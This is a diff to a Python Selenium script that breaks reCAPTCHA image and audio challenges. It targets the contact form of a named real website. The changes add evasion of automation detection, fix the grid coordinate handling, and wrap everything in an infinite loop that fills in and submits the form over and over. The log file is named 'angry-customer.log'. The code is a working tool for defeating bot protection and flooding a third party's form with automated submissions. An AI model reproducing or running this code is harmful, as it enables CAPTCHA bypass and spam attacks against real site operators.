@@ -75,6 +75,10 @@ def should_click_image(img, x, y, store, classifier):
     ans = image.predict(os.path.abspath(img))
     logging.debug(ans)
 
+    if classifier.lower() == "stairs":
+        if "Staircase" in ans:
+            return store_in_dict(img, x, y, store, classifier)
+
     if classifier.lower() == "store front":
         if "Housing" in ans or "Building" in ans or "Architecture" in ans or "City" in ans or "Town" in ans or "Urban" in ans:
             return store_in_dict(img, x, y, store, classifier)
@@ -190,8 +194,8 @@ def image_recaptcha(driver, iframe):
         idx = 0
         files = [TASK_PATH+"\\"+f for f in os.listdir(TASK_PATH) if "output_" in f]
         for f in files:
-            y = math.floor(idx % max_height + 1)  # making coordinates 1 indexed to match xpaths
             x = math.floor(idx / max_width + 1)
+            y = math.floor(idx % max_width + 1)
             to_solve_queue[(x, y)] = f
             idx += 1
         
@@ -326,7 +330,8 @@ def fill_out_profile(driver):
 
 ##############################  MAIN  ##############################
 def main():
-    logging.basicConfig(stream=sys.stderr, level=LEVEL)
+    logging.basicConfig(filename='angry-customer.log', filemode='w', level=LEVEL)
+
     chrome_options = webdriver.ChromeOptions()
     chrome_options.add_argument("--disable-bundled-ppapi-flash")
     #chrome_options.add_argument("--incognito")
@@ -350,75 +355,84 @@ def main():
     logging.debug("[*] Cookies cleared")
     logging.debug("[ ] Starting driver with user agent %s" % agent)
 
-    logging.info("[*] Starting attack on Amass's recaptcha")
-    driver.get("https://www.amass.ro/contact.html")
+    #Initiate attack in an infinite loop
+    while True:
 
-    #avoid detection of automated control
-    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false,})")
-    wait_between(1, 4)
+        logging.info("[*] Starting attack on Amass's recaptcha")
+        driver.get("https://www.amass.ro/contact.html")
 
-    logging.debug("[*] Filling out Contact form")
-    fill_out_profile(driver)
-    WebDriverWait(driver, 2000).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")))
-    iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")
+        #avoid detection of automated control
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false,})")
+        wait_between(1, 4)
 
-    driver.delete_all_cookies()
-    driver.switch_to.frame(iframeSwitch)
-    #ActionChains(driver).move_to_element(iframeSwitch).perform()
-    driver.delete_all_cookies()
-    logging.info("[*] Recaptcha located. Engaging")
-    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-anchor")))
-    ele = driver.find_element(By.ID, "recaptcha-anchor")
-    #ActionChains(driver).move_to_element(ele).perform()
-    ele.click()
-    driver.switch_to.default_content()  
+        logging.debug("[*] Filling out Contact form")
+        fill_out_profile(driver)
 
-    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")))
-    iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
-    driver.switch_to.frame(iframe)
-    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "rc-imageselect")))
-    
-    if ATTACK_IMAGES:
-        image_recaptcha(driver, iframe)
+        #scroll to end of form
+        submit = driver.find_element(By.ID, "send-message")
+        driver.execute_script("arguments[0].scrollIntoView();", submit)
 
-    elif ATTACK_AUDIO:
-        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-audio-button")))
-        time.sleep(1)
-        driver.find_element(By.ID, "recaptcha-audio-button").click()
+        WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")))
+        iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")
 
-        guess_again = True
+        driver.delete_all_cookies()
+        driver.switch_to.frame(iframeSwitch)
+        #ActionChains(driver).move_to_element(iframeSwitch).perform()
+        driver.delete_all_cookies()
+        logging.info("[*] Recaptcha located. Engaging")
+        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-anchor")))
+        ele = driver.find_element(By.ID, "recaptcha-anchor")
+        #ActionChains(driver).move_to_element(ele).perform()
+        ele.click()
+        driver.switch_to.default_content()
 
-        while guess_again:
-            init("audio")
-            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "audio-source")))
-            # Parse table details offline
-            body = driver.find_element(By.CSS_SELECTOR, "body").get_attribute('innerHTML').encode("utf8")
-            soup = BeautifulSoup(body, 'html.parser')
-            link = soup.findAll("a", {"class": "rc-audiochallenge-tdownload-link"})[0]
-            urllib.request.urlretrieve(link["href"], TASK_PATH + "/" + TASK + ".mp3")
-            guess_str = get_numbers(TASK_PATH + "/" + TASK, TASK_PATH + "/")
-            type_style(driver, "audio-response", guess_str)
-            # results.append(guess_str)
-            wait_between(0.5, 3)
-            driver.find_element(By.ID, "recaptcha-verify-button").click()
-            wait_between(1, 2.5)
-            try:
-                logging.debug("Checking if Google wants us to solve more...")
-                driver.switch_to.default_content()
-                driver.switch_to.frame(iframeSwitch)
-                checkmark_pos = driver.find_element(By.CLASS_NAME, "recaptcha-checkbox-checkmark").get_attribute("style")
-                guess_again = not (checkmark_pos == "background-position: 0 -600px")
-                driver.switch_to.default_content()
-                iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
-                driver.switch_to.frame(iframe)
-            except Exception as e:
-                print (e)
-                guess_again = False
-  
-    input("")
+        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")))
+        iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
+        driver.switch_to.frame(iframe)
+        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "rc-imageselect")))
 
-    driver.find_element(By.ID, "send-message").click()
-    wait_between(0.5, 5)
+        if ATTACK_IMAGES:
+            image_recaptcha(driver, iframe)
+
+        elif ATTACK_AUDIO:
+            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-audio-button")))
+            time.sleep(1)
+            driver.find_element(By.ID, "recaptcha-audio-button").click()
+
+            guess_again = True
+
+            while guess_again:
+                init("audio")
+                WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "audio-source")))
+                # Parse table details offline
+                body = driver.find_element(By.CSS_SELECTOR, "body").get_attribute('innerHTML').encode("utf8")
+                soup = BeautifulSoup(body, 'html.parser')
+                link = soup.findAll("a", {"class": "rc-audiochallenge-tdownload-link"})[0]
+                urllib.request.urlretrieve(link["href"], TASK_PATH + "/" + TASK + ".mp3")
+                guess_str = get_numbers(TASK_PATH + "/" + TASK, TASK_PATH + "/")
+                type_style(driver, "audio-response", guess_str)
+                # results.append(guess_str)
+                wait_between(0.5, 3)
+                driver.find_element(By.ID, "recaptcha-verify-button").click()
+                wait_between(1, 2.5)
+                try:
+                    logging.debug("Checking if Google wants us to solve more...")
+                    driver.switch_to.default_content()
+                    driver.switch_to.frame(iframeSwitch)
+                    checkmark_pos = driver.find_element(By.CLASS_NAME, "recaptcha-checkbox-checkmark").get_attribute("style")
+                    guess_again = not (checkmark_pos == "background-position: 0 -600px")
+                    driver.switch_to.default_content()
+                    iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
+                    driver.switch_to.frame(iframe)
+                except Exception as e:
+                    print (e)
+                    guess_again = False
+
+        driver.switch_to.default_content()
+        driver.execute_script("arguments[0].scrollIntoView();", submit)
+        wait_between(3, 5)
+        submit.click()
+        wait_between(3, 5)
 
 main()
 # test_all()
